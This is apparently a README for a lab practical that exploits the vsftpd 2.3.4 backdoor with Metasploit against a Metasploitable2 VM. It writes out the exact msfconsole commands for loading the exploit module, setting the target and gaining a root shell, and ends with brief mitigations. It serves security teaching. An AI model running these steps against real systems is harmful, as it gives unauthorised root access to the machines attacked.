@@ -1,0 +1,81 @@
+# 🔥 Practical 1: Hacking Linux OS using Metasploit Framework
+
+## 📌 Description
+This practical demonstrates how to exploit the **vsftpd 2.3.4 backdoor vulnerability** in a Linux environment using Metasploit Framework, gaining a remote root shell on the target system.
+
+## 🛠 Tools Used
+- Kali Linux  
+- Metasploit Framework  
+- Metasploitable2 VM  
+
+---
+
+## 🚀 Step-by-Step Procedure
+
+### **Step 1 — Start Metasploit**
+```bash
+msfconsole
+```
+![Start Metasploit](images/step1.png)
+
+---
+
+### **Step 2 — Search for vsftpd backdoor exploit**
+```bash
+search vsftpd
+```
+![Search Exploit](images/step2.png)
+
+---
+
+### **Step 3 — Load the Exploit**
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+![Use Exploit](images/step3.png)
+
+---
+
+### **Step 4 — Set Target IP**
+```bash
+set RHOSTS 192.168.1.105
+```
+![Set RHOSTS](images/step4.png)
+
+---
+
+### **Step 5 — Run the Exploit**
+```bash
+exploit
+```
+![Exploit Run](images/step5.png)
+
+---
+
+### **Step 6 — Verify Access**
+```bash
+whoami
+uname -a
+```
+![Shell Access](images/step6.png)
+
+---
+
+## 🧠 Why This Exploit Works
+vsftpd 2.3.4 contains a **hidden malicious backdoor** that opens a remote shell on **port 6200** when a specially crafted username with `:)` is sent.
+
+Metasploit automates the backdoor trigger.
+
+---
+
+## 🔒 Mitigation
+- Update vsftpd to the latest version  
+- Disable anonymous FTP access  
+- Use firewalls to restrict FTP access  
+
+---
+
+## 📁 Files Included
+- `commands.txt`
+- `screenshots/` (upload your screenshots here)
+
